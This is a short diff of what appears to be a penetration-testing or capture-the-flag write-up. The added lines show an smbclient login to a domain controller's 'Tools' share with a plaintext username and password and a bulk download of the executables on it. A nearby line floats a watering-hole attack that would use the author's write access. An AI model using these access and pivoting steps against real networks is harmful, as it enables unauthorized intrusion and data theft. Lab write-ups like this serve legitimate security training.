@@ -517,6 +517,20 @@ smb: \>
 ```
 Ill look into some of these files and if i find nothing it might be worth trying a watering hole attack abusing my write access
 
+```python
+smbclient //dc1.dismay.hsm/Tools -U 'mike.silver'%'Password123!'
+Try "help" to get a list of possible commands.
+smb: \> prompt off
+smb: \> mget *
+getting file \Dism.exe of size 329072 as Dism.exe (339.3 KiloBytes/sec) (average 339.3 KiloBytes/sec)
+getting file \mspaint.exe of size 909312 as mspaint.exe (862.1 KiloBytes/sec) (average 611.7 KiloBytes/sec)
+getting file \note.txt of size 628 as note.txt (1.6 KiloBytes/sec) (average 511.2 KiloBytes/sec)
+getting file \notepad.exe of size 225280 as notepad.exe (502.3 KiloBytes/sec) (average 509.8 KiloBytes/sec)
+getting file \osk.exe of size 708608 as osk.exe (442.7 KiloBytes/sec) (average 485.8 KiloBytes/sec)
+smb: \>
+```
+Ill transfer all to my machine
+
 
 
 
